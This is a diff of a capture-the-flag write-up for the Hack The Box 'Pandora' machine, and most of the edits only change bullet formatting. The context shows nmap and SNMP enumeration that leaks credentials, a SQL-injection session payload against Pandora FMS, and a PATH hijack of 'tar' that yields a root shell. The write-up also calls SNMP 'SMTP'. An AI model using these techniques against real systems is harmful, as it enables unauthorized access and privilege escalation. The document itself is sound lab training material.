@@ -28,7 +28,7 @@ tags:
 
 ## Port Scan 
 we start with our usual NMAP scan:
-- sudo nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.136
+* sudo nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.136
 
 ```
 # Nmap 7.92 scan initiated Fri Dec  9 08:14:08 2022 as: nmap -sS -sV -sC -p- -vvv -oA nmap/allPorts 10.10.11.136
@@ -68,21 +68,21 @@ Since we only find 2 ports, we will start with port 80 and go to http://10.10.11
 We find that they reffer to **panda.htb** and we add it /etc/hosts and then navigate to [http://panda.htb](http://panda.htb). But we get the same page.
 
 After some extra enumeration I did not find anything interesting so I continue to perferm a ***UDP*** scan:
-- sudo nmap -sU -sV -vvv panda.htb
+* sudo nmap -sU -sV -vvv panda.htb
 
 ![](/assets/images/htb-writeup-Pandora/pandora2.png)
 
 I found that it is running port 161 with SMTP enabled, and i found some credentials:
 
-- snmpwalk -c public -v1 10.10.11.136 > smtp.txt
-- smtp.txt | grep daniel
+* snmpwalk -c public -v1 10.10.11.136 > smtp.txt
+* smtp.txt | grep daniel
 
 ![](/assets/images/htb-writeup-Pandora/pandora3.png)
 
 
 ## Gaining foothold
 We test the credentials found on SMTP. I got access on ssh (***port 22***) and create a Dynamic port in case just in case I need it.
- - ssh -D 1234 daniel@10.10.11.136
+ * ssh -D 1234 daniel@10.10.11.136
 
  ![](/assets/images/htb-writeup-Pandora/pandora5.png)
 
@@ -105,6 +105,7 @@ I find a vulnerability on "***Pandora FMS -v7.0NG.742_FIX_PERL2020***" related t
 I tried some scripts but none of them worked so I just took a closer look at this [GitHub Repo](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated)
 
 reading the code, they show the original code injection:
+
 ```
 #Exploit Injection
 http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- SgGO
@@ -171,7 +172,7 @@ I try to use **strings** to get some extra information about the binary but as t
 ![](/assets/images/htb-writeup-Pandora/pandora15.png)
 
 We can see that the program is using tar but not the complete path, that means we can "highjack" that path and create a program named ***tar*** and make it do something we want like:
-- /usr/bin/sh
+* /usr/bin/sh
 
 
 To do this we go to a folder create the file and then add that to the begining to the PATH variable that the system has. After creating the file we just add the path to the **PATH** system variable 
